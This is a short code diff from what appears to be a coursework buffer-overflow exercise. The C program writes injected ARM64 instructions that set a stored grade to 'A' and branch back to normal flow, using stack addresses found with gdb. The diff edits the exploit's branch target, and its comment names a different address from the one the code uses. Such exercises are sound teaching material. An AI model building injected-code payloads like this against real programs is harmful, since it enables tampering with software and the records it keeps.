@@ -37,15 +37,15 @@ int main() {
     MOV = MiniAssembler_mov(0, 'A');
     fwrite(&MOV, sizeof(unsigned int), 1, file);
 
-    /* STR content of register W0 into the address pointed by X1
+    /* STR A in register W0 into the address pointed by X1
     branch back to normal program flow after setting grade to A */
     STRB = MiniAssembler_strb(0, 1);
     fwrite(&STRB, sizeof(unsigned int), 1, file);
 
     /* B back to return address */ 
     /* 0x40087c is instruction address after getName returns
-    0xffffffffea20 is the injected instruction address based on gdb */
-    B = MiniAssembler_b(0x40087c, 0xffffffffea20);
+    0xffffffffea00 is the injected instruction address based on gdb */
+    B = MiniAssembler_b(0x40087c, 0xffffffffea38);
     fwrite(&B, sizeof(unsigned int), 1, file);
 
     fclose(file);
